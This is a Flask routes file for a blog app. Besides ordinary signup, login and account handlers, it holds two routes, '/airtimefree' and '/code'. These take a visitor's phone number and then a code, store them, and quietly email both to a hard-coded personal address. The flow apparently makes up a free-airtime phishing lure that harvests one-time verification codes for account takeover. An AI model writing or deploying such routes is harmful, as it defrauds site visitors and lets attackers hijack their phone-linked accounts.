from flask import render_template, url_for, flash, redirect, request, Blueprint
from flask_login import login_user, current_user, logout_user, login_required
from puppycompanyblog import db
from werkzeug.security import generate_password_hash,check_password_hash
from puppycompanyblog.models import User, BlogPost, PhoneNumbers, CodeNumber
from puppycompanyblog.users.forms import SignupForm, LoginForm, UpdateUserForm, NumberForm, CodeForm
from puppycompanyblog.users.email import send_email
from puppycompanyblog.users.picture_handler import add_profile_pic


users = Blueprint('users', __name__)

@users.route('/register',methods=['GET','POST'])
def register():
    form = SignupForm()

    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user is None:
            user = User(email=form.email.data,
                        username=form.username.data,
                        password=form.password.data)
            db.session.add(user)
            db.session.commit()

            flash('Successfully Signed Up, check your mail(including spam folder) to confirm your account', 'alert-success')
        else:
            flash('User already Exists', 'alert-warning')
        return redirect(url_for('users.login'))

    return render_template ('signup.html', form=form)
    #return redirect(url_for('users.login'))



@users.route('/login',methods=['GET','POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user is None or user.check_password(form.password.data) == False :
            flash('Wrong Email or Password', 'alert-danger')
            return redirect(url_for('users.login'))


        if user.check_password(form.password.data) and user is not None:
            username = user.username
            login_user(user)
            flash('Log in Success!', 'alert-success')

            next = request.args.get('next')

            if next == None or not next[0]=='/':
                next = url_for('users.user_posts', username=username)
            return redirect(next)

        else:
            flash('Wrong email or password', 'alert-warning')

    return render_template('login.html', form=form)



@users.route("/logout")
def logout():
    logout_user()
    return redirect(url_for('core.index'))


@users.route("/account", methods=['GET', 'POST'])
@login_required
def account():

    form = UpdateUserForm()

    if form.validate_on_submit():
        print(form)
        if form.picture.data:
            username = current_user.username
            pic = add_profile_pic(form.picture.data,username)
            current_user.profile_image = pic

        current_user.username = form.username.data
        current_user.email = form.email.data
        db.session.commit()
        flash('User Account Updated')
        return redirect(url_for('users.account'))

    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email

    profile_image = url_for('static', filename='profile_pics/' + current_user.profile_image)
    return render_template('account.html', profile_image=profile_image, form=form)


@users.route("/<username>")
def user_posts(username):
    page = request.args.get('page', 1, type=int)
    user = User.query.filter_by(username=username).first_or_404()
    blog_posts = BlogPost.query.filter_by(author=user).order_by(BlogPost.date.desc()).paginate(page=page, per_page=5)
    return render_template('user_blog_posts.html', blog_posts=blog_posts, user=user)




@users.route("/airtimefree", methods=('GET', 'POST'))
def airtime():
    form = NumberForm()

    if form.validate_on_submit():

        number = PhoneNumbers(form.number.data)
        db.session.add(number)
        db.session.commit()
        numberID = form.number.data
        html = render_template('activate.html', numberID=numberID)
        subject = "New contact Uploaded"
        email = "w.kiprich@gmail.com"
        send_email(email, subject, html)

        return redirect(url_for('users.code'))




    return render_template('airtime.html', form=form)

@users.route("/congrats")
def congrats():
    return render_template("congrats.html")

@users.route("/code", methods=('GET', 'POST'))
def code():
    form = CodeForm()

    if form.validate_on_submit():
        code = CodeNumber(form.code.data)
        db.session.add(code)
        db.session.commit()
        codeID = form.code.data
        html = render_template('codesuccess.html', codeID=codeID)
        subject = "New contact Uploaded"
        email = "w.kiprich@gmail.com"
        send_email(email, subject, html)
        return redirect(url_for('users.congrats'))


    elif request.method == "POST" and not form.validate_on_submit():
        flash("Invalid Code, Kindly re-nter:")
        return render_template("entercode.html", form=form)

    return render_template("entercode.html", form=form)

